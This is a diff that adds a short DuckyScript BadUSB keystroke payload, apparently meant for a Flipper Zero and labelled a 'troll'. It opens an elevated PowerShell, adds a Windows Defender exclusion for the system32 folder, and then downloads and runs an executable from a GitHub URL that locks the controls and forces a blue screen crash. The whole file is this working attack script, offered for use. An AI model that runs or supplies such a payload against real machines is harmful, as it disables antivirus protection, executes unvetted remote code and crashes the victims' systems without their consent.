@@ -1,0 +1,23 @@
+REM     Title:  BSOD Rick Roll
+
+REM     Author:  UNC0V3R3D
+
+REM     Target:  Windows 7/10/11
+
+REM     Category:  Trolls
+
+REM     Description:  This Payload Downloads And Runs An Executable That Displays A Short Rick Roll Video While Locking Controlls Right Before The Video Starts Glitching, Then Explodes, And Invokes A BSOD.
+
+
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/DevBubba/FlipperZero/raw/main/BadUSB/Trolls/BSODRickRoll/Rick_Dist.exe';$file='Rick_Dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+ENTER
